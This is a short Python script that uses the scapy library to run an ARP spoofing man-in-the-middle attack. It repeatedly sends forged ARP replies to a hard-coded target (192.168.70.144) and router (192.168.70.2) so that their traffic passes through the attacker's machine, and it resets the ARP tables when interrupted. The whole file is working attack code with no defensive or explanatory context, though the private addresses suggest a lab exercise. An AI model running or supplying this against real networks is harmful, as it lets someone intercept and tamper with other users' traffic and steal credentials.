#!/usr/bin/env python3
import time
import scapy.all as scapy


def get_MAC(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_bro = broadcast / arp_req
    answered_list = scapy.srp(arp_req_bro, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def restore(des_ip, sour_ip):
    packet = scapy.ARP(op=2, pdst=des_ip, hwdst=get_MAC(des_ip), psrc=sour_ip, hwsrc=get_MAC(sour_ip))
    scapy.send(packet, count=4, verbose=False)


def spoof(target_IP, spoof_IP):
    packet = scapy.ARP(op=2, pdst=target_IP, hwdst=get_MAC(target_IP), psrc=spoof_IP)
    scapy.send(packet, verbose=False)


router = "192.168.70.2"
target = "192.168.70.144"
try:
    sent_pac_count = 0
    while True:
        spoof(target, router)
        spoof(router, target)
        sent_pac_count += 2
        print("\r[+] Packets sent: " + str(sent_pac_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ....... Resetting ARP tables..... Please wait.\n")
    restore(target, router)
    restore(router, target)
